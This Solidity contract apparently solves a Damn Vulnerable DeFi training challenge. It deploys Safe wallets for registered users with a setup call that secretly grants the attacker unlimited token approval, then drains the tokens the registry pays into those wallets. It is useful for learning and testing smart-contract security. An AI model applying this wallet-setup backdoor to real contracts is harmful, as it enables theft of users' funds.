// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";

contract Attack {
    WalletRegistry walletRegistry;
    SafeProxyFactory walletFactory;
    Safe singletonCopy;
    DamnValuableToken token;
    SafeProxy[] proxies;
    address[] users;
    address recovery;

    uint256 constant PAYMENT_AMOUNT = 10e18;


    constructor(address _walletRegistry, address payable _singletonCopy, address _walletFactory, address[] memory _users, address _token, address _recovery) {
        walletRegistry = WalletRegistry(_walletRegistry);
        singletonCopy = Safe(_singletonCopy);
        walletFactory = SafeProxyFactory(_walletFactory);
        users = _users;
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function deploySafeWallet() public {
        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,                             // owners
                    1,                                  // threshold
                    address(this),                      // to
                    abi.encodeCall(this.approve, (address(token), address(this))),     // data
                    address(0),                         // fallbackHandler
                    address(0),                         // paymentToken
                    0,                                  // payment
                    payable(address(0))                 // paymentReceiver
                )
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback({
                _singleton : address(singletonCopy),
                initializer : initializer,
                saltNonce : i,
                callback : walletRegistry
            });

            proxies.push(proxy);
        }
    }

    function approve(address _token, address _spender) public {
        DamnValuableToken(_token).approve(_spender, type(uint256).max);
    }

    function drain() public {
        for (uint256 i = 0; i < proxies.length; i++) {
            token.transferFrom(address(proxies[i]), address(this), PAYMENT_AMOUNT);
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }

    function attack() external {
        deploySafeWallet();
        drain();
    }

}